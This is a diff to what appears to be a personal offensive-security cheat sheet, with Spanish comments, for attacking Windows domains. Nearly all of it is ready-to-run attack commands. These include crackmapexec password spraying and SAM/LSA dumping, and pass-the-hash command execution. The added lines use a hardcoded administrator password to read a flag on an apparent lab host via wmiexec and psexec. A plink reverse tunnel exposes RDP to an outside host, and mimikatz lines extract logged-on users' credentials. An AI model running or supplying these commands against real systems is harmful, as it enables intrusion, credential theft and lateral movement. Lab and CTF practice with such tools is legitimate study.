@@ -3,16 +3,23 @@ python3 /usr/share/doc/python3-impacket/examples/smbserver.py compartida . -smb2
 impacket-smbserver COMPARTIDA . -smb2support -u USUARIO -p PASSWORD
 
 # crackmapexec
+# modulos
 crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz
 crackmapexec smb 10.21.16.0/24 -u 'user' -p cul_spray.txt -M enum_avproducts
 crackmapexec smb IP -u USER -p PASS --shares -M spider_plus
+
 crackmapexec smb ip -u 'user' -H 'hash' -x 'CMD'
 crackmapexec smb ip -u user.txt -p pass.txt --continue-on-success
 crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --rid-brute
 crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --local-auth --shares
 crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --local-auth --sam
-crackmapexec smb 10.21.16.0/24 -u 'users.txt' -p cul_spray.txt
-crackmapexec smb IP -u user -p pass --shares --M spider_plus
+crackmapexec smb 10.10.232.10 -u administrator -p 'RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi' --lsa
+crackmapexec smb 10.10.232.10 -u administrator -p 'RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi' --shares
+crackmapexec smb 10.10.232.10 -u administrator -p 'RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi' --local-auth -x 'type C:\Users\administrator\Desktop\admin_flag.txt'
+crackmapexec smb 10.10.232.10 -u administrator -p 'RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi' --local-auth --exec-method wmiexec -x 'type C:\Users\administrator\Desktop\admin_flag.txt'
+
+impacket-wmiexec 'administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi@10.10.232.10' 'type C:\Users\administrator\Desktop\admin_flag.txt'
+impacket-psexec administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi@10.10.232.10 'type C:\Users\Administrator\Desktop\admin_flag.txt'
 
 # psexec
 psexec.py 'user_ssh:pass_ssh'@'ip' "C:\plink.exe -batch -hostkey 'hostkey' -N -R 9090:127.0.0.1:3389 'IP_A' -P 1473 -l 'USUARIO' -pw 'PASSWORD_A'"
@@ -50,8 +57,9 @@ enumerate OS - Get-NetComputer -fulldata | select operatingsystem
 enumerate kerberoastable users - Get-NetUser -SPN | select samaccountname,description
 
 # mimikatz
-privilege::debug
-lsadump::lsa /patch
+mimikatz# lsadump::lsa /patch
+mimikatz# privilege::debug --> chequea si tenes los permisos necesarios
+mimikatz# sekurlsa::logonpasswords --> extrae las credenciales de los usuarios logueados
 
 # invoke-kerberoast
 python3 -m SimpleHTTPServer 80
